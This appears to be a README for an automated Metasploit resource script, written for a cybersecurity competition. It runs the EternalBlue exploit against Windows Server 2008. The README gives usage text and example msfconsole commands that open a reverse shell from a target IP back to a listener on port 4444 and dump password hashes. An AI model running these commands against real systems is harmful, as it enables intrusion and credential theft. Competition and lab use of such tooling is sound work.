# Eternal Blue
This was one of the automated exploit scripts I developed for the [cyber force competition](https://cyberforcecompetition.com/). It's only been tested on Windows Server 2008.
 
```
Description:
  This RC file can be used to exploit EternalBlue and dump password hashes.

Usage:
  msfconsole -r [rc_path] [rhost] [lhost] [lport]

Arguments:
  rc_path      - Full path to the RC script
  rhost        - Remote target IP Address
  lhost        - Local IP Address
  lport        - Port to open locally for callback

Examples:
  Get the help screen:
    msfconsole -r eternal_blue.rc help
  Attempt to pwn 10.0.0.8 from 10.0.0.130 over port 4444:
    msfconsole -r eternal_blue.rc 10.0.0.8 10.0.0.130 4444

Author:
  Jayson Grace (jayson.e.grace@gmail.com)
```

Pop shell on 10.0.0.8 from 10.0.0.130 and dump the password hashes.
```bash
msfconsole -r eternal_blue.rc 10.0.0.8 10.0.0.130 4444
```
